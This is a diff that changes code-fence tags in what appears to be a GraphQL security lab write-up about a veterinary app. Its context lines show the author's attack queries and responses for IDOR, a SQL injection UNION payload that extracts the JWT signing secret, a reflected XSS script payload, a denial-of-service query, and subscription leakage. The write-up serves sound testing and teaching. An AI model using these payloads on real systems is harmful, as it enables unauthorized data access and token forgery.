@@ -62,7 +62,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3M
 
 I send a GraphQL request to the query `myInfo(...)` using the obtained access token BUT I specify the identifier **2** that the one of **Dr Benoit**:
 
-```json
+```text
 query brokenAccessControl {
   myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNTQ2NDQyOTAyfQ.H9A-vXRsiivFGShtdhiR3N2lSDDx-sNqbbJxMRNnExI", veterinaryId: 2){
     id, name, dogs {
@@ -74,7 +74,7 @@ query brokenAccessControl {
 
 I receive in the GraphQL response the list of Dogs associated with **Dr Benoit**:
 
-```json
+```text
 {
   "data": {
     "myInfo": {
@@ -111,7 +111,7 @@ In my labs I have a vulnerability on this point about SQLi in query `dogs(namePr
 
 I send this GraphQL request in order to list the content of the `CONFIG` table
 
-```json
+```text
 query sqli {
   dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
     id
@@ -122,7 +122,7 @@ query sqli {
 
 I receive in the GraphQL response the secret used to sign JWT token along the name of the dog for which the name start **ab**:
 
-```json
+```text
 {
   "data": {
     "dogs": [
@@ -149,7 +149,7 @@ About XSS, it's interesting to note that the GraphQL response reflect the parame
 
 I send this GraphQl request to the query `myInfo(accessToken: String!, veterinaryId: Int!): Veterinary`, i replace the Veterinary identifier (that is an integer) by a String XSS payload:
 
-```json
+```text
 query sqli {
   myInfo(accessToken: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNTQ2NDU1MDQwfQ.P87Ef-GM99a_vzzbUf2RprUYxFgxgPnSukaVnz22BJ0",
     veterinaryId: "<script>alert('XSS')</script>") {
@@ -160,7 +160,7 @@ query sqli {
 
 I receive this GraphQL response that reflect my payload, so, depending on the GraphQL client and is escaping/sanitizing behavior it can open the door to XSS:
 
-```json
+```text
 {
   "data": null,
   "errors": [
@@ -212,7 +212,7 @@ In my labs I have a vulnerability on this point for query, precisely in the quer
 
 When I send this request, I cause my CPU to go to 100% during several minutes and my DB is local because it's an SQLite
 
-```json
+```text
 query dos {
   allDogs(onlyFree: false, limit: 1000000) {
     id
@@ -331,7 +331,7 @@ When the GraphQL server meet an unexpected error (I/O with storages, NullPointer
 
 When I send this request query on my lab (invalid token):
 
-```json
+```text
 query testErrorHandling {
   myInfo(accessToken:"aaaa", veterinaryId: 2){
     id, name, dogs {
@@ -345,7 +345,7 @@ query testErrorHandling {
 
 I receive this reponse that it inform me that i have acted on the system and caused an unexpected behavior. Perhaps, for example, i have generated a stack trace on app log and if the app log files are rotating on date (daily) and not on size then i can send multiple time this resquest to fill the disk with errors logs...
 
-```json
+```text
 {
   "data": {
     "myInfo": null
@@ -386,7 +386,7 @@ Using the **Documentation Explorer** of GraphiQL we see that the identifier are 
 
 Request query to detect IDOR:
 
-```json
+```text
 query detectIDOR {
   allDogs{
     id,veterinary{
@@ -398,7 +398,7 @@ query detectIDOR {
 
 The response show the sequential identifier for Dog and Veterinay:
 
-```json
+```text
 {
   "data": {
     "allDogs": [
@@ -477,7 +477,7 @@ I can see the subscriptions exposed via the schema:
 
 If I send this subscription request to receive event from the *newAssociation* subscription:
 
-```json
+```text
 subscription subscribeToNewAssociation{
   newAssociation
 }
@@ -491,7 +491,7 @@ Your subscription data will appear here after server publication!
 
 And when i create a association via this mutation request in another browser for example:
 
-```json
+```text
 mutation associateDog{
   	associateDogToMe(accessToken: "eyJ0eXAiOiJKV1Qi...", veterinaryId: 4, dogId: 198){
     name
@@ -501,7 +501,7 @@ mutation associateDog{
 
 The mutation response prove that the action has been performed at data level:
 
-```json
+```text
 {
   "data": {
     "associateDogToMe": {
@@ -513,7 +513,7 @@ The mutation response prove that the action has been performed at data level:
 
 After a moment, i receive this notification in response to my subscription:
 
-```json
+```text
 {
   "newAssociation": "Dog['Dobby'] associated with Veterinary['Maxime']."
 }
